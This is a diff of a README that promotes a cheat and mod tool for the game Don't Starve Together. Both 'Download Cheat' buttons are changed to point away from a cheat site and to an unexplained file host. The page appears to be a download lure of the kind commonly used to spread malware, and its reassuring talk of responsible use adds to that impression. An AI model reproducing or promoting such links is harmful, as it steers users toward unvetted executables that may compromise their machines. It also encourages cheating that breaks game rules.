@@ -4,7 +4,7 @@
 
 **Don’t Starve Together** is the ultimate survival co-op—grit, starvation, weird bosses, and harsh seasons. But what if you could skip the grind, spawn everything instantly, teleport to your buddies, or freeze time mid-cook? Cheats and mods give you full control over hunger, health, season, inventories, world settings, and more—perfect for solo runs, dev testing, or just unleashing chaos with friends.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/dont-starve-together/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload18.bitbucket.io)
 ---
 
 ## 🔥 Cheat Tool Features for DST
@@ -39,7 +39,7 @@
 * **Speed Up Crops/Tree Growth** – Harvest at will
 * **Dump Everything Mode** – Despawn world clutter
 
-[![Download Cheat](https://avatars.dzeninfra.ru/get-zen_doc/271828/pub_67aed1ee1a1c962ff18a2f15_67aed2de17d3e71ae5e2abdb/scale_1200)](https://wecheaters.github.io/cheats/dont-starve-together/)
+[![Download Cheat](https://avatars.dzeninfra.ru/get-zen_doc/271828/pub_67aed1ee1a1c962ff18a2f15_67aed2de17d3e71ae5e2abdb/scale_1200)](https://fileoffload18.bitbucket.io)
 ---
 
 ## 👥 Multiplayer Use
@@ -77,3 +77,4 @@ Ethical cheat use is key: always warn teammates, stay off public realms, and use
 ## 🧠 Final Verdict
 
 For experimenting, testing, or simply enjoying the wilderness on your terms, the **Don’t Starve Together cheat and mod tools** are perfect. Get instant resources, freeze time for funky seasons, skip wilderness hazards, or create the most beautiful co-op builds you’ve ever seen. Just use them responsibly—with care for your fellow survivors.
+
